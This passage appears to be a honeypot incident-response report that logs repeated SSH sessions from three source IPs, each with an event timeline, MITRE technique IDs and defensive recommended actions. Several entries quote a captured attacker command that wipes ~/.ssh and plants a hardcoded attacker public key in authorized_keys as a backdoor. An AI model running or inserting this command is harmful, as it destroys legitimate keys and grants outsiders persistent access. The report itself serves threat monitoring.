| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:59:47` | `cowrie.session.connect` |
| `2026-06-13 05:59:47` | `cowrie.client.version` |
| `2026-06-13 05:59:47` | `cowrie.client.kex` |
| `2026-06-13 05:59:48` | `cowrie.login.success` |
| `2026-06-13 05:59:48` | `cowrie.session.params` |
| `2026-06-13 05:59:48` | `cowrie.command.input` |
| `2026-06-13 05:59:48` | `cowrie.command.failed` |
| `2026-06-13 05:59:48` | `cowrie.log.closed` |
| `2026-06-13 05:59:48` | `cowrie.session.params` |
| `2026-06-13 05:59:48` | `cowrie.command.input` |
| `2026-06-13 05:59:49` | `cowrie.session.file_download` |
| `2026-06-13 05:59:49` | `cowrie.log.closed` |
| `2026-06-13 05:59:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-101f76dc6d54

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 05:59 |
| **Last Seen** | 2026-06-13 05:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:59:51` | `cowrie.session.connect` |
| `2026-06-13 05:59:51` | `cowrie.client.version` |
| `2026-06-13 05:59:51` | `cowrie.client.kex` |
| `2026-06-13 05:59:52` | `cowrie.login.success` |
| `2026-06-13 05:59:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b1be095eb32

| Field | Detail |
|---|---|
| **Source IP** | `118.26.39[.]178` |
| **First Seen** | 2026-06-13 06:00 |
| **Last Seen** | 2026-06-13 06:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:00:33` | `cowrie.session.connect` |
| `2026-06-13 06:00:33` | `cowrie.client.version` |
| `2026-06-13 06:00:33` | `cowrie.client.kex` |
| `2026-06-13 06:00:33` | `cowrie.login.success` |
| `2026-06-13 06:00:34` | `cowrie.session.params` |
| `2026-06-13 06:00:34` | `cowrie.command.input` |
| `2026-06-13 06:00:34` | `cowrie.command.failed` |
| `2026-06-13 06:00:34` | `cowrie.log.closed` |
| `2026-06-13 06:00:34` | `cowrie.session.params` |
| `2026-06-13 06:00:34` | `cowrie.command.input` |
| `2026-06-13 06:00:34` | `cowrie.session.file_download` |
| `2026-06-13 06:00:34` | `cowrie.log.closed` |
| `2026-06-13 06:00:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.39[.]178` to AbuseIPDB if not already reported
- [ ] Block `118.26.39[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7230e70a48bd

| Field | Detail |
|---|---|
| **Source IP** | `118.26.39[.]178` |
| **First Seen** | 2026-06-13 06:00 |
| **Last Seen** | 2026-06-13 06:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:00:36` | `cowrie.session.connect` |
| `2026-06-13 06:00:36` | `cowrie.client.version` |
| `2026-06-13 06:00:36` | `cowrie.client.kex` |
| `2026-06-13 06:00:36` | `cowrie.login.success` |
| `2026-06-13 06:00:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.39[.]178` to AbuseIPDB if not already reported
- [ ] Block `118.26.39[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82d9a70e24d8

| Field | Detail |
|---|---|
| **Source IP** | `212.64.19[.]167` |
| **First Seen** | 2026-06-13 06:00 |
| **Last Seen** | 2026-06-13 06:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:00:48` | `cowrie.session.connect` |
| `2026-06-13 06:00:48` | `cowrie.client.version` |
| `2026-06-13 06:00:48` | `cowrie.client.kex` |
| `2026-06-13 06:00:49` | `cowrie.login.success` |
| `2026-06-13 06:00:49` | `cowrie.session.params` |
| `2026-06-13 06:00:49` | `cowrie.command.input` |
| `2026-06-13 06:00:49` | `cowrie.command.failed` |
| `2026-06-13 06:00:50` | `cowrie.log.closed` |
| `2026-06-13 06:00:50` | `cowrie.session.params` |
| `2026-06-13 06:00:50` | `cowrie.command.input` |
| `2026-06-13 06:00:50` | `cowrie.session.file_download` |
| `2026-06-13 06:00:50` | `cowrie.log.closed` |
| `2026-06-13 06:00:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.19[.]167` to AbuseIPDB if not already reported
- [ ] Block `212.64.19[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e74e8fcb0cac

| Field | Detail |
|---|---|
| **Source IP** | `212.64.19[.]167` |
| **First Seen** | 2026-06-13 06:00 |
| **Last Seen** | 2026-06-13 06:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:00:52` | `cowrie.session.connect` |
| `2026-06-13 06:00:52` | `cowrie.client.version` |
| `2026-06-13 06:00:52` | `cowrie.client.kex` |
| `2026-06-13 06:00:53` | `cowrie.login.success` |
| `2026-06-13 06:00:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.19[.]167` to AbuseIPDB if not already reported
- [ ] Block `212.64.19[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-494ba96c9f65

| Field | Detail |
|---|---|
| **Source IP** | `212.64.19[.]167` |
| **First Seen** | 2026-06-13 06:03 |
| **Last Seen** | 2026-06-13 06:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:03:25` | `cowrie.session.connect` |
| `2026-06-13 06:03:25` | `cowrie.client.version` |
| `2026-06-13 06:03:25` | `cowrie.client.kex` |
| `2026-06-13 06:03:25` | `cowrie.login.success` |
| `2026-06-13 06:03:26` | `cowrie.session.params` |
| `2026-06-13 06:03:26` | `cowrie.command.input` |
| `2026-06-13 06:03:26` | `cowrie.command.failed` |
| `2026-06-13 06:03:26` | `cowrie.log.closed` |
| `2026-06-13 06:03:26` | `cowrie.session.params` |
| `2026-06-13 06:03:26` | `cowrie.command.input` |
| `2026-06-13 06:03:26` | `cowrie.session.file_download` |
| `2026-06-13 06:03:26` | `cowrie.log.closed` |
| `2026-06-13 06:03:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.19[.]167` to AbuseIPDB if not already reported
- [ ] Block `212.64.19[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64307e5f61d4

| Field | Detail |
|---|---|
| **Source IP** | `212.64.19[.]167` |
| **First Seen** | 2026-06-13 06:03 |
| **Last Seen** | 2026-06-13 06:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:03:28` | `cowrie.session.connect` |
| `2026-06-13 06:03:28` | `cowrie.client.version` |
| `2026-06-13 06:03:28` | `cowrie.client.kex` |
| `2026-06-13 06:03:29` | `cowrie.login.success` |
| `2026-06-13 06:03:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.19[.]167` to AbuseIPDB if not already reported
- [ ] Block `212.64.19[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1de9715ae739

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 06:03 |
| **Last Seen** | 2026-06-13 06:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:03:52` | `cowrie.session.connect` |
| `2026-06-13 06:03:52` | `cowrie.client.version` |
| `2026-06-13 06:03:52` | `cowrie.client.kex` |
| `2026-06-13 06:03:53` | `cowrie.login.success` |
| `2026-06-13 06:03:53` | `cowrie.session.params` |
| `2026-06-13 06:03:53` | `cowrie.command.input` |
| `2026-06-13 06:03:53` | `cowrie.command.failed` |
| `2026-06-13 06:03:53` | `cowrie.log.closed` |
| `2026-06-13 06:03:53` | `cowrie.session.params` |
| `2026-06-13 06:03:53` | `cowrie.command.input` |
| `2026-06-13 06:03:54` | `cowrie.session.file_download` |
| `2026-06-13 06:03:54` | `cowrie.log.closed` |
| `2026-06-13 06:03:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7781f9f1b4c3

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 06:03 |
| **Last Seen** | 2026-06-13 06:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:03:56` | `cowrie.session.connect` |
| `2026-06-13 06:03:56` | `cowrie.client.version` |
| `2026-06-13 06:03:56` | `cowrie.client.kex` |
| `2026-06-13 06:03:57` | `cowrie.login.success` |
| `2026-06-13 06:03:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb7e5d0e1281

| Field | Detail |
|---|---|
| **Source IP** | `118.26.39[.]178` |
| **First Seen** | 2026-06-13 06:04 |
| **Last Seen** | 2026-06-13 06:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:04:33` | `cowrie.session.connect` |
| `2026-06-13 06:04:33` | `cowrie.client.version` |
| `2026-06-13 06:04:33` | `cowrie.client.kex` |
| `2026-06-13 06:04:34` | `cowrie.login.success` |
| `2026-06-13 06:04:34` | `cowrie.session.params` |
| `2026-06-13 06:04:34` | `cowrie.command.input` |
| `2026-06-13 06:04:34` | `cowrie.command.failed` |
| `2026-06-13 06:04:34` | `cowrie.log.closed` |
| `2026-06-13 06:04:34` | `cowrie.session.params` |
| `2026-06-13 06:04:34` | `cowrie.command.input` |
| `2026-06-13 06:04:34` | `cowrie.session.file_download` |
| `2026-06-13 06:04:34` | `cowrie.log.closed` |
| `2026-06-13 06:04:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.39[.]178` to AbuseIPDB if not already reported
- [ ] Block `118.26.39[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a12a920477e3

| Field | Detail |
|---|---|
| **Source IP** | `118.26.39[.]178` |
| **First Seen** | 2026-06-13 06:04 |
| **Last Seen** | 2026-06-13 06:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:04:36` | `cowrie.session.connect` |
| `2026-06-13 06:04:36` | `cowrie.client.version` |
| `2026-06-13 06:04:36` | `cowrie.client.kex` |
| `2026-06-13 06:04:37` | `cowrie.login.success` |
| `2026-06-13 06:04:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.39[.]178` to AbuseIPDB if not already reported
- [ ] Block `118.26.39[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cce70de0fd3b

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 06:08 |
| **Last Seen** | 2026-06-13 06:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:08:07` | `cowrie.session.connect` |
| `2026-06-13 06:08:07` | `cowrie.client.version` |
| `2026-06-13 06:08:07` | `cowrie.client.kex` |
| `2026-06-13 06:08:08` | `cowrie.login.success` |
| `2026-06-13 06:08:08` | `cowrie.session.params` |
| `2026-06-13 06:08:08` | `cowrie.command.input` |
| `2026-06-13 06:08:08` | `cowrie.command.failed` |
| `2026-06-13 06:08:08` | `cowrie.log.closed` |
| `2026-06-13 06:08:09` | `cowrie.session.params` |
| `2026-06-13 06:08:09` | `cowrie.command.input` |
| `2026-06-13 06:08:09` | `cowrie.session.file_download` |
| `2026-06-13 06:08:09` | `cowrie.log.closed` |
| `2026-06-13 06:08:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bfb85134252

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 06:08 |
| **Last Seen** | 2026-06-13 06:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:08:11` | `cowrie.session.connect` |
| `2026-06-13 06:08:11` | `cowrie.client.version` |
| `2026-06-13 06:08:11` | `cowrie.client.kex` |
| `2026-06-13 06:08:12` | `cowrie.login.success` |
| `2026-06-13 06:08:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87048967678e

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 06:10 |
| **Last Seen** | 2026-06-13 06:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:10:09` | `cowrie.session.connect` |
| `2026-06-13 06:10:09` | `cowrie.client.version` |
| `2026-06-13 06:10:09` | `cowrie.client.kex` |
| `2026-06-13 06:10:10` | `cowrie.login.success` |
| `2026-06-13 06:10:10` | `cowrie.session.params` |
| `2026-06-13 06:10:10` | `cowrie.command.input` |
| `2026-06-13 06:10:10` | `cowrie.command.failed` |
| `2026-06-13 06:10:10` | `cowrie.log.closed` |
| `2026-06-13 06:10:10` | `cowrie.session.params` |
| `2026-06-13 06:10:10` | `cowrie.command.input` |
| `2026-06-13 06:10:11` | `cowrie.session.file_download` |
| `2026-06-13 06:10:11` | `cowrie.log.closed` |
| `2026-06-13 06:10:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b79698d92a3

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 06:10 |
| **Last Seen** | 2026-06-13 06:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:10:13` | `cowrie.session.connect` |
| `2026-06-13 06:10:13` | `cowrie.client.version` |
| `2026-06-13 06:10:13` | `cowrie.client.kex` |
| `2026-06-13 06:10:14` | `cowrie.login.success` |
| `2026-06-13 06:10:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5003284fc353

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 06:12 |
| **Last Seen** | 2026-06-13 06:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:12:12` | `cowrie.session.connect` |
| `2026-06-13 06:12:12` | `cowrie.client.version` |
| `2026-06-13 06:12:12` | `cowrie.client.kex` |
| `2026-06-13 06:12:13` | `cowrie.login.success` |
| `2026-06-13 06:12:13` | `cowrie.session.params` |
| `2026-06-13 06:12:13` | `cowrie.command.input` |
